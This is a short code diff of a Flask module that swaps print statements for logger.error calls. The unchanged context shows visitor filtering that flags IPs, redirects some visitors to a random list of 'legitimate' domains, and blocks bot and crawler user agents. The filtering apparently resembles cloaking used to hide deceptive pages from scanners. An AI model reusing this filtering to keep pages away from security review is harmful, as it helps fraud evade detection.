@@ -5,6 +5,9 @@ import re
 from flask import render_template_string, request, redirect
 from dotenv import load_dotenv
 import os
+import logging
+
+logger = logging.getLogger(__name__)
 
 load_dotenv()
 
@@ -60,7 +63,7 @@ class PageTemplateHandler:
                 self.FLAGGED_IPS.add(ip)
                 return True
         except Exception as e:
-            print("Error checking IP:", e)
+            logger.error("Error checking IP: %s", e)
 
         return False
 
@@ -99,7 +102,7 @@ class PageTemplateHandler:
                 'error': data.get('error', 'Invalid response from server')
             }
         except Exception as e:
-            print("Exception in verify_page_visit:", str(e))
+            logger.error("Exception in verify_page_visit: %s", str(e))
             return {
                 'success': False,
                 'error': str(e)
@@ -117,7 +120,7 @@ class PageTemplateHandler:
                 return redirect(random.choice(self.LEGITIMATE_DOMAINS)), None
                 
         except Exception as e:
-            print(f"Error checking IP info: {e}")
+            logger.error("Error checking IP info: %s", e)
 
         if not user_agent or "bot" in user_agent.lower() or "crawler" in user_agent.lower():
             return None, "Access denied: Suspicious activity detected"
